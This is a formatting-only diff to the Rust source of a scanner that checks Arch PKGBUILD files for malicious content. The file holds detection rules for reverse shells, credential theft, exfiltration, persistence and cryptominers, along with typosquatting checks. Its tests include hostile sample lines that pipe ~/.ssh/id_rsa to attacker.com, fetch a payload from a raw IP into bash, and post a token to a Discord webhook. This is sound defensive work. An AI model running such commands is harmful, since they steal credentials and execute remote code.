@@ -76,7 +76,6 @@ pub const RULES: &[Rule] = &[
         pattern: r##"\$\(\s*(?:echo|printf|cat)\s+.*(?:\|.*){2,}\)"##,
         description: "deeply nested substitution with pipe chain (obfuscated execution)",
     },
-
     // --- Exfiltration ---
     Rule {
         id: "EXFIL_DISCORD_WEBHOOK",
@@ -120,7 +119,6 @@ pub const RULES: &[Rule] = &[
         pattern: r##"\b(?:nc|ncat|socat)\b\s+(?:-[a-zA-Z]*\s+)*[0-9a-zA-Z]"##,
         description: "netcat or socat connection (reverse shell or data socket)",
     },
-
     // --- Reverse Shells ---
     Rule {
         id: "REVSHELL_DEV_TCP",
@@ -140,7 +138,6 @@ pub const RULES: &[Rule] = &[
         pattern: r##"python[23]?\s+-c\s+['"].*import\s+(?:socket|subprocess|os)"##,
         description: "python one-liner importing socket/subprocess (reverse shell script)",
     },
-
     // --- Credential Theft ---
     Rule {
         id: "CRED_SSH_KEYS",
@@ -202,7 +199,6 @@ pub const RULES: &[Rule] = &[
         pattern: r##"(?:cat|cp|tar|curl)\s+[^#\n]*(?:\.bash_history|\.zsh_history|\.histfile)"##,
         description: "copying or exfiltrating shell history logs",
     },
-
     // --- Persistence ---
     Rule {
         id: "PERSIST_SYSTEMD",
@@ -234,7 +230,6 @@ pub const RULES: &[Rule] = &[
         pattern: r##"/etc/udev/rules\.d/"##,
         description: "creating custom udev rule for event-driven execution",
     },
-
     // --- Packaging Abuse ---
     Rule {
         id: "PKG_SKIP_HASH",
@@ -272,7 +267,6 @@ pub const RULES: &[Rule] = &[
         pattern: r##"\bnpm\s+install\b|\bbun\s+install\b|\byarn\s+install\b"##,
         description: "unlocked npm/bun/yarn install in build (dependency confusion attack vector)",
     },
-
     // --- Suspicious System Commands ---
     Rule {
         id: "SUS_CHMOD_SUID",
@@ -316,7 +310,6 @@ pub const RULES: &[Rule] = &[
         pattern: r##"alias\s+(?:ls|cat|sudo|pacman|yay|paru)="##,
         description: "aliasing core shell commands (environment hijacking)",
     },
-
     // --- Cryptojacking ---
     Rule {
         id: "MINER_XMRIG",
@@ -359,7 +352,10 @@ impl PKGBUILDScanner {
             .collect();
 
         let popular_packages = Self::load_popular_packages();
-        Self { rules, popular_packages }
+        Self {
+            rules,
+            popular_packages,
+        }
     }
 
     fn load_popular_packages() -> Vec<String> {
@@ -415,7 +411,9 @@ impl PKGBUILDScanner {
                     findings.push(Finding {
                         rule_id: "TYPOSQUATTING".to_string(),
                         severity: "MEDIUM".to_string(),
-                        description: format!("Package '{name}' closely resembles high-profile package '{target}'"),
+                        description: format!(
+                            "Package '{name}' closely resembles high-profile package '{target}'"
+                        ),
                         line_number: 1,
                         matched_text: format!("{name} -> {target}"),
                     });
@@ -454,7 +452,9 @@ impl PKGBUILDScanner {
                     findings.push(Finding {
                         rule_id: "SUS_LONG_ENCODED_STRING".to_string(),
                         severity: "HIGH".to_string(),
-                        description: "Long base64-like encoded string found (may hide second-stage payload)".to_string(),
+                        description:
+                            "Long base64-like encoded string found (may hide second-stage payload)"
+                                .to_string(),
                         line_number: idx + 1,
                         matched_text: format!("{}...", &line.trim()[..line.trim().len().min(80)]),
                     });
@@ -537,14 +537,10 @@ fn damerau_levenshtein(s1: &str, s2: &str) -> usize {
     for i in 1..=len_a {
         for j in 1..=len_b {
             let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
-            d[i + 1][j + 1] = *[
-                d[i][j + 1] + 1,
-                d[i + 1][j] + 1,
-                d[i][j] + cost,
-            ]
-            .iter()
-            .min()
-            .unwrap();
+            d[i + 1][j + 1] = *[d[i][j + 1] + 1, d[i + 1][j] + 1, d[i][j] + cost]
+                .iter()
+                .min()
+                .unwrap();
 
             if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                 d[i + 1][j + 1] = d[i + 1][j + 1].min(d[i - 1][j - 1] + 1);
@@ -606,7 +602,10 @@ package() {
 }
 "#;
         let findings = s.scan(content, Some("foot-terminal"));
-        assert!(findings.is_empty(), "Expected clean scan, got: {findings:?}");
+        assert!(
+            findings.is_empty(),
+            "Expected clean scan, got: {findings:?}"
+        );
     }
 
     #[test]
@@ -622,7 +621,11 @@ package() {
         let s = test_scanner();
         let content = "curl -d 'token' https://discord.com/api/webhooks/123/abc\n";
         let findings = s.scan(content, None);
-        assert!(findings.iter().any(|f| f.rule_id == "EXFIL_DISCORD_WEBHOOK"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "EXFIL_DISCORD_WEBHOOK")
+        );
     }
 
     #[test]
@@ -630,7 +633,11 @@ package() {
         let s = test_scanner();
         let content = "cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com\n";
         let findings = s.scan(content, None);
-        assert!(findings.iter().any(|f| f.rule_id == "CRED_SSH_KEYS" || f.rule_id == "CRED_SSH_DIR"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "CRED_SSH_KEYS" || f.rule_id == "CRED_SSH_DIR")
+        );
     }
 
     #[test]
@@ -638,7 +645,11 @@ package() {
         let s = test_scanner();
         let content = "curl http://194.26.29.112/payload.sh | bash\n";
         let findings = s.scan(content, None);
-        assert!(findings.iter().any(|f| f.rule_id == "EXFIL_RAW_IP" || f.rule_id == "EXFIL_CURL_PIPE_EXEC"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "EXFIL_RAW_IP" || f.rule_id == "EXFIL_CURL_PIPE_EXEC")
+        );
     }
 
     #[test]
